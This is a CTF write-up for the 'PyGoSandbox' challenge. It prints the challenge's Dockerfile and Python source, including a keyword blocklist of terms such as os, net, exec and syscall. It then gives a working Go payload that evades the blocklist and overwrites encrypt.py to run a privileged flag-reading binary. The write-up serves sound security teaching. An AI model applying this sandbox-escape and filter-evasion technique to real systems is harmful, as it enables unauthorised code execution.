# CTF Writeup: PyGoSandbox

## Challenge Information

- **Challenge Name:** PyGoSandbox
- **Challenge level:** Hard (3 solves)
- **Author:** zAbuQasem
- **CTF Event:** CATF 23
- **Category:** MISC

## Description

I'm back stronger than ever, after failing to build a secure calculator, i made a life changing career shift!, now i'm building top notch Golang sandboxes that no one with IQ lower than 0.567 can bypass. Can you?!

## Solution

### Initial Analysis

1- We take a look at the Dockerfile to know what we have to do, we will find that the real flag is in the `/root` dir and there is a fake flag as env variable and there is a `/FlagReader` which we have to execute to get the flag.

**Dockerfile**
```
FROM golang:alpine@sha256:6f592e0689192b7e477313264bb190024d654ef0a08fb1732af4f4b498a2e8ad
ENV CGO_ENABLED=0
ENV PYTHONUNBUFFERED=1
ENV FLAG="FLAG{TrY_H4rD3R_!!!}"

RUN apk add --update --no-cache build-base gcc python3 socat && ln -sf python3 /usr/bin/python && python3 -m ensurepip 
RUN pip3 install --no-cache --upgrade pip setuptools rich

WORKDIR /app
COPY src .
COPY FlagReader.c /FlagReader.c
RUN gcc /FlagReader.c -o /FlagReader && rm /FlagReader.c
RUN chmod 555 challenge.py && chmod +xs /FlagReader

RUN echo "CATF{FAKE_FLAG_FOR_TESTING}" > /root/flag.txt
RUN adduser -D meow && chown -R meow /app
USER meow

ENTRYPOINT ["python3","challenge.py"]

```

2- When we inspect the `encrypt.py` file we will find that it encrypts the fake flag. **intersting**

**encrypt.py**

```
import hashlib
from os import getenv
from rich.console import Console

meow = Console()
def EncryptFlag():
	# MEOW
	flag =  getenv("FLAG")
	digest = hashlib.sha256(flag.encode()).hexdigest()
	meow.print(f"[white]Encrypted Flag[/white]: [blue]{digest}[/blue]")

```

3- Lets inspect the `challenge.py` it blocks some words`BLOCKLIST = ["Scan","os","net","exec","syscall","cli","bufio","Flag","chatgpt"]` and sice it blocks the os word we can't do what we want directly so we have to find another indirect way

**Challenge.py**

```
import subprocess
from rich.console import Console
import sys
sys.tracebacklimit = 0

meow = Console()

def GoRunner():
    try:
        BLOCKLIST = ["Scan","os","net","exec","syscall","cli","bufio","Flag","chatgpt"]
        meow.print("[bold white][+] Welcome to the safest Golang Sandbox compiler in the wild!...[/bold white]")
        meow.print("[green]\[🐱] Meow your Go code Below Ending with 'EOF' (Spam enter to finish):[/green]")
        go_code = ""
        while True:
            line = input()
            if line == "EOF":
                break
            go_code += line + "\n"
        
        if any([b in go_code for b in BLOCKLIST]):
            meow.print("[bold red]\[!] Hacker Detected!![/bold red]")
            exit(2)
        with open('temp.go', 'w') as file:
            file.write(go_code)

        run_code = subprocess.Popen(['go', 'run','temp.go'],stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        run_code, compile_error = run_code.communicate()
        meow.print(run_code.decode())
        subprocess.run(['rm', 'temp.go'])
    except Exception:
        pass


def EncryptFlag():
    from encrypt import EncryptFlag
    EncryptFlag()
    

def main():
    try:
        GoRunner()
        EncryptFlag()
    except Exception:
        pass

main()

```

### Finding Clues

1- We can use the `io` package which can read and write files... but even if we can read we cant read the flag since we don't have the permission and even if we can write a file we can't execute it 

2- The challenge imports the `EncryptFlag` function from the encrypt.py file and executes it after our go code gets executed **The Ultra Major Clue**
```
def EncryptFlag():
    from encrypt import EncryptFlag
    EncryptFlag()
    
```

### Exploitation

We can overwrite the `encrypt.py` with our python code and let the challenge it self exectute it so to craft our payload first thing we need is to write a python code to execute the `/FlagReader` inside a function called `EncryptFlag()` but we have a problem here which is we cant use the word `Flag` in our payload and to mitigate this problem we can use `flag` and then capitalize the `F` for the file name we can use the `replace()` function and for the function name we can use `globals()["Encryptflag".replace("f", "F")] = Encryptflag` so now we are done form the python code. The second thing we need is to write a go code to overwrite the `encrypt.py` and as we said eralier we can use `io/ioutil` to do that, so now we are ready to send our payload and get our flag

### payload

```
package main

import (
	"fmt"
	"io/ioutil"
)

func main() {
	// The file where to write data
	filePath := "encrypt.py"

	// The data you want to write to the file
	data := `
import subprocess
def Encryptflag():
	flag = "/flagReader"
	flag = flag.replace("f", "F")
	result = subprocess.check_output([flag], universal_newlines=True)
	print(result)
globals()["Encryptflag".replace("f", "F")] = Encryptflag
`

	// Write data to the file
	err := ioutil.WriteFile(filePath, []byte(data), 0644)
	if err != nil {
		fmt.Println("Error writing to file:", err)
		return
	}

	fmt.Println("Data written to the file successfully.")
}
EOF
```

**FLAG**
`CATF{GoL4ng_S4nDb0x_xB0x_1337_e477313264bb190024d654ef0a08fb1732af4f4b498a2e8ad__2@23_}`
